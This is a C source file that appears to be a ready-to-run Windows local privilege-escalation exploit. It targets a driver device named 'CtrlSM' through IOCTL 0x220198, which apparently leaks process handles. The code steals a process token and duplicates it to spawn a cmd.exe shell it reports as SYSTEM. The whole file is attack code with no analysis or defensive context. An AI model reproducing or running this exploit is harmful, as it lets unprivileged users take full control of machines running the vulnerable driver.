#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <tchar.h>

#define DEVICE_NAME "\\\\.\\CtrlSM"
#define TARGET_IOCTL 0x220198

HANDLE get_leaked_handle(HANDLE hDevice, DWORD pid) {
    HANDLE hLeaked = NULL;
    DWORD bytesReturned;

    BOOL result = DeviceIoControl(
        hDevice,
        TARGET_IOCTL,
        &pid, sizeof(pid),         // PID input
        &hLeaked, sizeof(hLeaked), // Out HANDLE pointer
        &bytesReturned,
        NULL
    );

    if (!result || hLeaked == NULL) {
        return NULL;
    }

    return hLeaked;
}

void spawn_system_shell(HANDLE token) {
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFO);

    if (!ImpersonateLoggedOnUser(token)) {
        printf("[-] Failed to impersonate token.\n");
        return;
    }

    printf("[+] Impersonated SYSTEM token. Spawning shell...\n");

    BOOL result = CreateProcessAsUserA(
        token,
        "C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL, NULL, FALSE, 0, NULL, NULL,
        &si, &pi
    );

    if (!result) {
        printf("[-] Failed to spawn SYSTEM shell. Error: %lu\n", GetLastError());
    } else {
        printf("[+] SYSTEM shell spawned! PID: %lu\n", pi.dwProcessId);
    }

    RevertToSelf();
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main() {
    printf("[*] Opening device: %s\n", DEVICE_NAME);

    HANDLE hDevice = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Device handle obtained: 0x%p\n", hDevice);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create process snapshot.\n");
        CloseHandle(hDevice);
        return 1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &pe)) {
        printf("[-] Process32First failed.\n");
        CloseHandle(snapshot);
        CloseHandle(hDevice);
        return 1;
    }

    do {
        DWORD pid = pe.th32ProcessID;
        if (pid <= 4) continue; // skip idle/system

        HANDLE hLeaked = get_leaked_handle(hDevice, pid);
        if (hLeaked == NULL || hLeaked == INVALID_HANDLE_VALUE)
            continue;

        DWORD realPid = GetProcessId(hLeaked);
        if (realPid == 0 || realPid != pid) {
            CloseHandle(hLeaked);
            continue;
        }

        printf("[+] Got handle to PID %lu (%ws)\n", pid, pe.szExeFile);

        HANDLE hToken = NULL, hDup = NULL;
        if (!OpenProcessToken(hLeaked, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken)) {
            printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
            CloseHandle(hLeaked);
            continue;
        }

        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
        if (!DuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            &sa,
            SecurityImpersonation,
            TokenPrimary,
            &hDup
        )) {
            printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
            CloseHandle(hToken);
            CloseHandle(hLeaked);
            continue;
        }

        spawn_system_shell(hDup);

        // Clean up
        CloseHandle(hToken);
        CloseHandle(hDup);
        CloseHandle(hLeaked);
        break; // done after first success

    } while (Process32Next(snapshot, &pe));

    CloseHandle(snapshot);
    CloseHandle(hDevice);
    return 0;
}
